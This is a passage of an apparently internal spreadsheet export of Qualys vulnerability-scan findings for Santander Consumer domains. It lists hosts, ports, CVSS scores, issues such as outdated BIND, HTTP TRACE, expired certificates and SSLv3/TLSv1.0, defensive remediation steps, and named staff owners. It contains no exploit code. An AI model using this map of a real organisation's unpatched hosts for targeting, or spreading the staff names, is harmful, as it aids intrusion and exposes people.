    <x v="0"/>
    <s v="High"/>
    <s v="7.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="53"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="ISC BIND (Berkley Internet Domain Name) es una implementación de protocolos DNS._x000a__x000a_Versiones afectadas:_x000a_BIND 9.0.0 -&gt; 9.11.37_x000a_BIND 9.16.0 -&gt; 9.16.50_x000a_BIND 9.18.0 -&gt; 9.18.27_x000a_BIND 9.19.0 -&gt; 9.19.24_x000a_Edición preliminar soportada por BIND 9.9.3-S1 -&gt; 9.11.37-S1_x000a_Versión preliminar compatible con BIND 9.16.8-S1 -&gt; 9.16.49-S1_x000a_Versión preliminar compatible con BIND 9.18.11-S1 -&gt; 9.18.27-S1_x000a__x000a_Versiones parcheadas:_x000a_BIND 9.18.28_x000a_BIND 9.20.0_x000a_Edición preliminar compatible con BIND 9.18.28-S1_x000a__x000a_Lógica de detección de QID: Esta comprobación no autenticada detecta los sistemas vulnerables obteniendo la información de la versión del servicio BIND mediante un banner."/>
    <s v="Se recomienda a los clientes que actualicen a la última versión parcheada de CVE-2024-1975_x000a_Parche:_x000a_A continuación se indican los enlaces para descargar los parches que corrigen las vulnerabilidades:_x000a_ CVE-2024-1975"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="199"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM--1479287979499901669"/>
    <m/>
    <x v="86"/>
    <m/>
    <x v="0"/>
    <s v="High"/>
    <s v="7.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="53"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="ISC BIND (Berkley Internet Domain Name) is an implementation of DNS protocols._x000a__x000a_Affected versions:_x000a_BIND 9.11.0 -&gt; 9.11.37_x000a_BIND 9.16.0 -&gt; 9.16.50_x000a_BIND 9.18.0 -&gt; 9.18.27_x000a_BIND 9.19.0 -&gt; 9.19.24_x000a_BIND Supported Preview Edition 9.11.4-S1 -&gt; 9.11.37-S1_x000a_BIND Supported Preview Edition 9.16.8-S1 -&gt; 9.16.50-S1_x000a_BIND Supported Preview Edition 9.18.11-S1 -&gt; 9.18.27-S1_x000a__x000a_Patched Versions:_x000a_BIND 9.18.28_x000a_BIND 9.20.0_x000a_BIND Supported Preview Edition 9.18.28-S1_x000a__x000a_QID Detection Logic:This unauthenticated check detects vulnerable systems by fetching the version information from the BIND service using banner."/>
    <s v="Customers are advised to upgrade to the patched version  latest release of CVE-2024-1737_x000a_Patch:_x000a_Following are links for downloading patches to fix the vulnerabilities:_x000a_ CVE-2024-1737"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="200"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-3297268407910315434"/>
    <m/>
    <x v="86"/>
    <m/>
    <x v="0"/>
    <s v="High"/>
    <s v="7.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="53"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="ISC BIND (Berkley Internet Domain Name) is an implementation of DNS protocols._x000a__x000a_Affected versions:_x000a_BIND 9.11.0 -&gt; 9.11.37_x000a_BIND 9.16.0 -&gt; 9.16.50_x000a_BIND 9.18.0 -&gt; 9.18.27_x000a_BIND 9.19.0 -&gt; 9.19.24_x000a_BIND Supported Preview Edition 9.11.4-S1 -&gt; 9.11.37-S1_x000a_BIND Supported Preview Edition 9.16.8-S1 -&gt; 9.16.50-S1_x000a_BIND Supported Preview Edition 9.18.11-S1 -&gt; 9.18.27-S1_x000a__x000a_Patched Versions:_x000a_BIND 9.18.28_x000a_BIND 9.20.0_x000a_BIND Supported Preview Edition 9.18.28-S1_x000a__x000a_QID Detection Logic:This unauthenticated check detects vulnerable systems by fetching the version information from the BIND service using banner."/>
    <s v="Customers are advised to upgrade to the patched version  latest release of CVE-2024-1737_x000a_Patch:_x000a_Following are links for downloading patches to fix the vulnerabilities:_x000a_ CVE-2024-1737"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="201"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="QA-VM--1878853719995110941"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2025-01-11T00:00:00"/>
    <n v="528"/>
    <d v="2025-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad Trace en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta Trace._x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="202"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="QA-VM-478382902759804846"/>
    <m/>
    <x v="4"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2025-01-11T00:00:00"/>
    <n v="528"/>
    <d v="2025-04-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor Web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos robar cookies y credenciales de autenticación o eludir el mecanismo de protección HttpOnly._x000a__x000a_Es necesario desactivar Track / Trace para cumplir con la normativa PCI."/>
    <s v="Desactive estos métodos en el archivo de configuración de su servidor web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="203"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="QA-VM-119202962390829848"/>
    <m/>
    <x v="3"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.8"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado un servidor Web compatible con el método HTTP TRACE. Este método permite la depuración y el análisis del rastreo de conexiones desde el cliente al servidor Web. Según la especificación HTTP, cuando se utiliza este método, el servidor Web devuelve la información enviada por el cliente sin modificar y sin filtrar. El servidor web Microsoft IIS utiliza un alias TRACK para este método, y es funcionalmente el mismo._x000a__x000a_Se ha descubierto una vulnerabilidad relacionada con este método. Un componente malicioso activo en una página Web puede enviar peticiones de Rastreo a un servidor Web que soporte este método de Rastreo. Normalmente, la seguridad del navegador impide el acceso a sitios Web fuera del dominio del sitio actual. Aunque es poco probable y difícil de lograr, es posible, en presencia de otras vulnerabilidades del navegador, que el contenido HTML activo haga peticiones externas a servidores Web arbitrarios más allá del servidor Web anfitrión. Dado que el servidor Web elegido devuelve la solicitud del cliente sin filtrar, la respuesta también incluye credenciales de autenticación basadas en cookies o en la Web (si se ha iniciado sesión) que el navegador envió automáticamente a la aplicación Web especificada en el servidor Web especificado. _x000a__x000a_La importancia de la capacidad Trace en esta vulnerabilidad es que el componente activo en la página visitada por el usuario víctima no tiene acceso directo a esta información de autenticación, sino que la obtiene después de que el servidor Web de destino se haga eco de ella como respuesta Trace._x000a_Dado que esta vulnerabilidad existe como soporte de un método requerido por la especificación del protocolo HTTP, los servidores Web más comunes son vulnerables._x000a__x000a_Los métodos exactos soportados, Trace y/o Track, y sus respuestas se encuentran en la sección Resultados más abajo._x000a__x000a_Track / Trace deben estar desactivados para cumplir con la normativa PCI."/>
    <s v="A continuación se ofrecen soluciones para algunos de los servidores Web más comunes. Para otros servidores Web, consulte la documentación de su proveedor._x000a__x000a_Apache: Las versiones recientes de Apache disponen de un módulo Rewrite que permite reescribir las peticiones HTTP o gestionarlas de una forma específica. Compile el servidor Apache con el módulo mod_rewrite. Es posible que tenga que descomentar las directivas «AddModule» y «LoadModule» en el archivo de configuración httpd.conf. Añada las siguientes líneas para cada virtualhost en su archivo de configuración (Tenga en cuenta que, por defecto, las configuraciones de reescritura no se heredan. Esto significa que necesita tener directivas Rewrite para cada host virtual en el que desee utilizarlo):_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} ^TRACE_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Con esta configuración, Apache captura todas las peticiones TRACE, y responde con una página informando de que la petición está prohibida. No se devuelve ningún contenido de la petición original._x000a__x000a_Una solución un poco más estricta es usar_x000a__x000a_&lt;IfModule mod_rewrite.c&gt;_x000a_RewriteEngine on_x000a_RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$_x000a_RewriteRule .* - [F]_x000a_&lt;/IfModule&gt;_x000a__x000a_Tenga en cuenta que RewriteEngine puede consumir mucho procesador y puede afectar al rendimiento del servidor web. El método de rastreo también puede controlarse mediante la directiva TraceEnable._x000a_En el httpd.conf añada o modifique:_x000a__x000a_TraceEnable Off_x000a__x000a_Microsoft IIS: Microsoft ha lanzado URLScan, que puede utilizarse para filtrar todas las solicitudes entrantes basándose en reglas personalizadas. URLScan puede utilizarse para desinfectar o deshabilitar las solicitudes TRACE de los clientes. Tenga en cuenta que IIS cambia 'TRACK' por 'TRACE'. Por lo tanto, si URLScan se utiliza para bloquear específicamente el método TRACE, el método TRACK también debe añadirse al filtro._x000a__x000a_URLScan utiliza el fichero de configuración 'urlscan.ini', normalmente en el directorio \System32\InetSrv\URLScan. En él, tenemos dos secciones - AllowVerbs y DenyVerbs. La primera se usa si la variable UseAllowVerbs está a 1, de lo contrario (si está a 0), se usan las DenyVerbs. Claramente, cualquiera de los dos puede ser usado, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una Default-Allow-Explicit-Deny. Para desautorizar los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK', 'TRACE' de la sección 'AllowVerbs' y añádalos a la sección 'DenyVerbs'. Con esto, URLScan desautorizará todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las peticiones que utilicen ese método. Para activar los cambios, reinicie el 'World Wide Web Publishing Service' desde la opción 'Servicios' del Panel de Control._x000a_Para más detalles sobre otros servidores web: Cert Advisory."/>
    <m/>
    <m/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="204"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Correos electronicos"/>
    <s v="QA-VM--429459081264403107"/>
    <m/>
    <x v="87"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="emaillink.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-12-07T00:00:00"/>
    <n v="563"/>
    <d v="2025-03-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el Certificado del servidor y extrae la Clave Pública del Certificado para establecer la conexión segura._x000a__x000a_No se puede confiar en un certificado cuya fecha de caducidad haya pasado."/>
    <s v="Por favor, instale un certificado de servidor con fechas de inicio y fin válidas."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="205"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Correos electronicos"/>
    <s v="QA-VM--7406095023816583372"/>
    <m/>
    <x v="88"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="emaillink.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2024-12-07T00:00:00"/>
    <n v="563"/>
    <d v="2025-03-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el certificado del servidor y extrae la clave pública del certificado para establecer la conexión segura. La autenticación se realiza verificando que la clave pública del certificado está firmada por una autoridad de certificación externa de confianza._x000a__x000a_Si un cliente no puede verificar el certificado, puede abortar la comunicación o pedir al usuario que continúe la comunicación sin autenticación."/>
    <s v="Instale un certificado de servidor firmado por una autoridad de certificación externa de confianza."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="206"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM--2124212459042238813"/>
    <m/>
    <x v="87"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el Certificado del servidor y extrae la Clave Pública del Certificado para establecer la conexión segura._x000a__x000a_No se puede confiar en un certificado cuya fecha de caducidad haya pasado."/>
    <s v="Por favor, instale un certificado de servidor con fechas de inicio y fin válidas."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="207"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-148889184291175704"/>
    <m/>
    <x v="88"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="443"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el certificado del servidor y extrae la clave pública del certificado para establecer la conexión segura. La autenticación se realiza verificando que la clave pública del certificado está firmada por una autoridad de certificación externa de confianza._x000a__x000a_Si un cliente no puede verificar el certificado, puede abortar la comunicación o pedir al usuario que continúe la comunicación sin autenticación."/>
    <s v="Instale un certificado de servidor firmado por una autoridad de certificación externa de confianza."/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="208"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-6520935409158606894"/>
    <m/>
    <x v="89"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="5.3"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="21"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="SSL 3.0 es un protocolo obsoleto e inseguro._x000a_El cifrado en SSL 3.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC._x000a_Se sabe que RC4 tiene sesgos, y el cifrado por bloques en modo CBC es vulnerable al ataque POODLE._x000a__x000a_El protocolo SSLv3 es inseguro debido al ataque POODLE y a la debilidad del cifrado RC4._x000a_Nota: En abril de 2016, PCI publicó PCI DSS v3.2 anunciando que el NIST ya no considera el protocolo Secure Socket Layers (SSL) v3.0 como aceptable para la protección de datos y que todas las versiones de las versiones SSL no cumplen con la definición PCI de «criptografía fuerte.»_x000a_ Este QID es un PCI FAIL automático de acuerdo con las normas PCI. _x000a__x000a_Encontrará más información en: _x000a_PCI: Guía del programa ASV v3.1 (página 27)_x000a_PCI: Uso de SSL Early TLS y escaneos ASV"/>
    <s v="Desactive el protocolo SSL 3.0 en el cliente y en el servidor, consulte _x000a_Cómo desactivar SSLv3 : Desactivar SSLv3"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="209"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-3828429137492812662"/>
    <m/>
    <x v="90"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="25"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="TLS es capaz de utilizar una multitud de cifrados (algoritmos) para crear los pares de claves pública y privada._x000a_Por ejemplo, TLSv1.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC._x000a_Se sabe que RC4 tiene sesgos y que el cifrado por bloques en modo CBC es vulnerable al ataque POODLE._x000a__x000a_TLSv1.0, si se configura para utilizar los mismos conjuntos de cifrado que SSLv3, incluye un medio por el cual una implementación TLS puede degradar la conexión a SSL v3.0, debilitando así la seguridad._x000a_También podría lanzarse un ataque de tipo POODLE directamente a TLS sin negociar un downgrade._x000a_ Este QID es un PCI FAIL automático de acuerdo con los estándares PCI. _x000a__x000a_Encontrará más detalles en: _x000a_PCI: Guía del Programa ASV v3.1 (página 27)_x000a_PCI: Uso de TLS anticipado SSL y escaneos ASV"/>
    <s v="Deshabilite el uso del protocolo TLSv1.0 en favor de un protocolo criptográficamente más fuerte como TLSv1.2._x000a_Los siguientes comandos openssl se pueden utilizar para hacer una prueba manual:_x000a_openssl s_client -connect ip:port -tls1_x000a__x000a_Si la prueba tiene éxito, entonces el objetivo soporta TLSv1"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="210"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-5628558436743707019"/>
    <m/>
    <x v="90"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="465"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="TLS es capaz de utilizar una multitud de cifrados (algoritmos) para crear los pares de claves pública y privada._x000a_Por ejemplo, TLSv1.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC._x000a_Se sabe que RC4 tiene sesgos y que el cifrado por bloques en modo CBC es vulnerable al ataque POODLE._x000a__x000a_TLSv1.0, si se configura para utilizar los mismos conjuntos de cifrado que SSLv3, incluye un medio por el cual una implementación TLS puede degradar la conexión a SSL v3.0, debilitando así la seguridad._x000a_También podría lanzarse un ataque de tipo POODLE directamente a TLS sin negociar un downgrade._x000a_ Este QID es un PCI FAIL automático de acuerdo con los estándares PCI. _x000a__x000a_Encontrará más detalles en: _x000a_PCI: Guía del Programa ASV v3.1 (página 27)_x000a_PCI: Uso de TLS anticipado SSL y escaneos ASV"/>
    <s v="Deshabilite el uso del protocolo TLSv1.0 en favor de un protocolo criptográficamente más fuerte como TLSv1.2._x000a_Los siguientes comandos openssl se pueden utilizar para hacer una prueba manual:_x000a_openssl s_client -connect ip:port -tls1_x000a__x000a_Si la prueba tiene éxito, entonces el objetivo soporta TLSv1"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="211"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM--6379084677383821471"/>
    <m/>
    <x v="90"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="21"/>
    <m/>
    <d v="2025-02-15T00:00:00"/>
    <n v="493"/>
    <d v="2025-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="TLS es capaz de utilizar una multitud de cifrados (algoritmos) para crear los pares de claves pública y privada._x000a_Por ejemplo, TLSv1.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC._x000a_Se sabe que RC4 tiene sesgos y que el cifrado por bloques en modo CBC es vulnerable al ataque POODLE._x000a__x000a_TLSv1.0, si se configura para utilizar los mismos conjuntos de cifrado que SSLv3, incluye un medio por el cual una implementación TLS puede degradar la conexión a SSL v3.0, debilitando así la seguridad._x000a_También podría lanzarse un ataque de tipo POODLE directamente a TLS sin negociar un downgrade._x000a_ Este QID es un PCI FAIL automático de acuerdo con los estándares PCI. _x000a__x000a_Encontrará más detalles en: _x000a_PCI: Guía del Programa ASV v3.1 (página 27)_x000a_PCI: Uso de TLS anticipado SSL y escaneos ASV"/>
    <s v="Deshabilite el uso del protocolo TLSv1.0 en favor de un protocolo criptográficamente más fuerte como TLSv1.2._x000a_Los siguientes comandos openssl se pueden utilizar para hacer una prueba manual:_x000a_openssl s_client -connect ip:port -tls1_x000a__x000a_Si la prueba tiene éxito, entonces el objetivo soporta TLSv1"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="212"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Info"/>
    <s v="QA-VM-7544844098723306993"/>
    <m/>
    <x v="90"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="6.5"/>
    <m/>
    <m/>
    <s v="info.santanderconsumer.co"/>
    <n v="587"/>
    <m/>
    <d v="2025-03-22T00:00:00"/>
    <n v="458"/>
    <d v="2025-06-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="TLS es capaz de utilizar una multitud de cifrados (algoritmos) para crear los pares de claves pública y privada._x000a_Por ejemplo, TLSv1.0 utiliza el cifrado de flujo RC4 o un cifrado de bloque en modo CBC._x000a_Se sabe que RC4 tiene sesgos y que el cifrado por bloques en modo CBC es vulnerable al ataque POODLE._x000a__x000a_TLSv1.0, si se configura para utilizar los mismos conjuntos de cifrado que SSLv3, incluye un medio por el cual una implementación TLS puede degradar la conexión a SSL v3.0, debilitando así la seguridad._x000a_También podría lanzarse un ataque de tipo POODLE directamente a TLS sin negociar un downgrade._x000a_ Este QID es un PCI FAIL automático de acuerdo con los estándares PCI. _x000a__x000a_Encontrará más detalles en: _x000a_PCI: Guía del Programa ASV v3.1 (página 27)_x000a_PCI: Uso de TLS anticipado SSL y escaneos ASV"/>
    <s v="Deshabilite el uso del protocolo TLSv1.0 en favor de un protocolo criptográficamente más fuerte como TLSv1.2._x000a_Los siguientes comandos openssl se pueden utilizar para hacer una prueba manual:_x000a_openssl s_client -connect ip:port -tls1_x000a__x000a_Si la prueba tiene éxito, entonces el objetivo soporta TLSv1"/>
    <m/>
    <m/>
    <m/>
    <s v="Sin Owner"/>
  </r>
  <r>
    <n v="213"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM--4740830077408392703"/>
    <m/>
    <x v="91"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <n v="443"/>
    <m/>
    <d v="2023-12-30T00:00:00"/>
    <n v="906"/>
    <d v="2024-03-29T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El escáner encontró información sobre la versión de PHP en las cabeceras devueltas por el servidor Web de destino habilitado para PHP. Esto probablemente significa que la variable expose_php está establecida en On en el archivo de configuración php.ini del servidor Web."/>
    <s v="Localice el archivo de configuración php.in en el host de destino y añádale este parámetro: expose_php=Off. Reinicie el servidor Web."/>
    <m/>
    <m/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="214"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="QA-VM--6346726614849417284"/>
    <m/>
    <x v="5"/>
    <m/>
